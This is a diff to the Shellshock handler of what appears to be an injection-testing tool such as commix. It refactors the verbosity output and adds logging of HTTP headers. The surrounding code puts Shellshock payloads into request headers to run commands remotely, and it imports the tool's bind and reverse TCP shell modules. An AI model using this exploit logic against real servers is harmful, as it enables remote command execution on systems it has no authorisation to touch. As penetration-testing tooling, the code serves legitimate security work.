@@ -13,10 +13,10 @@ from src.utils import settings
 
 from src.thirdparty.colorama import Fore, Back, Style, init
 
-from src.core.requests import headers
 from src.core.shells import bind_tcp
 from src.core.shells import reverse_tcp
 from src.core.requests import parameters
+from src.core.requests import headers as log_http_headers
 from src.core.injections.controller import checks
 
 readline_error = False
@@ -644,11 +644,16 @@ def shellshock_handler(url, http_request_method, filename):
         payload = shellshock_payloads(cve, attack_vector)
 
         # Check if defined "--verbose" option.
-        if settings.VERBOSITY_LEVEL >= 1:
+        if settings.VERBOSITY_LEVEL == 1:
           sys.stdout.write("\n" + settings.print_payload(payload))
+        elif settings.VERBOSITY_LEVEL > 1:
+          info_msg = "Generating a payload for injection..."
+          print "\n" + settings.print_info_msg(info_msg)
+          print settings.print_payload(payload)
 
         header = {check_header : payload}
         request = urllib2.Request(url, None, header)
+        log_http_headers.check_http_traffic(request)
         response = urllib2.urlopen(request)
 
         percent = ((i*100)/total)
@@ -792,11 +797,14 @@ def shellshock_handler(url, http_request_method, filename):
                       if shell != "":
                         print "\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n"
                       else:
-                        if settings.VERBOSITY_LEVEL >= 1:
-                          info_msg = "Executing the '" + cmd + "' command: "
-                          sys.stdout.write("\n"+settings.print_info_msg(info_msg))
-                          sys.stdout.flush()
-                          sys.stdout.write("\n" + settings.print_payload(payload)+ "\n")                          
+                        info_msg = "Executing the '" + cmd + "' command... "
+                        if settings.VERBOSITY_LEVEL == 1:
+                          sys.stdout.write("\n" + settings.print_info_msg(info_msg))
+                        elif settings.VERBOSITY_LEVEL > 1:
+                          sys.stdout.write(settings.print_info_msg(info_msg))
+                        sys.stdout.flush()
+                        sys.stdout.write("\n" + settings.print_payload(payload)+ "\n")
+
                           #print "\n" + settings.print_payload(payload) 
                         err_msg = "The '" + cmd + "' command, does not return any output."
                         print settings.print_critical_msg(err_msg) + "\n"
@@ -866,11 +874,21 @@ def cmd_exec(url, cmd, cve, check_header, filename):
   """
   def check_for_shell(url, cmd, cve, check_header, filename):
     try:
+
       TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
       cmd = "echo " + TAG + "$(" + cmd + ")" + TAG
       payload = shellshock_exploitation(cve, cmd)
+      info_msg = "Executing the '" + cmd + "' command... "
+      if settings.VERBOSITY_LEVEL == 1:
+        sys.stdout.write("\n" + settings.print_info_msg(info_msg))
+      elif settings.VERBOSITY_LEVEL > 1:
+        sys.stdout.write(settings.print_info_msg(info_msg))
+      sys.stdout.flush()
+      sys.stdout.write("\n" + settings.print_payload(payload)+ "\n")
       header = { check_header : payload }
       request = urllib2.Request(url, None, header)
+      log_http_headers.check_http_traffic(request)
+      # Checking the HTTP requests.s - Verbose >= 2
       response = urllib2.urlopen(request)
       shell = response.read().rstrip().replace('\n',' ')
       shell = re.findall(r"" + TAG + "(.*)" + TAG, shell)
@@ -885,19 +903,13 @@ def cmd_exec(url, cmd, cve, check_header, filename):
   if len(shell) == 0:
     cmd = "/bin/" + cmd
     shell, payload = check_for_shell(url, cmd, cve, check_header, filename)
-    if settings.VERBOSITY_LEVEL >= 1 and len(shell) > 0:
-      info_msg = "Executing the '" + cmd + "' command: "
-      sys.stdout.write("\n"+settings.print_info_msg(info_msg))
-      sys.stdout.flush()
-      sys.stdout.write("\n" + settings.print_payload(payload))
-    if len(shell) == 0:
+    if len(shell) > 0:
+      pass
+    elif len(shell) == 0:
       cmd = "/usr" + cmd
       shell, payload = check_for_shell(url, cmd, cve, check_header, filename)
-      if settings.VERBOSITY_LEVEL >= 1 and len(shell) > 0:
-        info_msg = "Executing the '" + cmd + "' command: "
-        sys.stdout.write("\n"+settings.print_info_msg(info_msg))
-        sys.stdout.flush()
-        sys.stdout.write("\n" + settings.print_payload(payload))
+      if len(shell) > 0:
+        pass
 
   return shell, payload
 
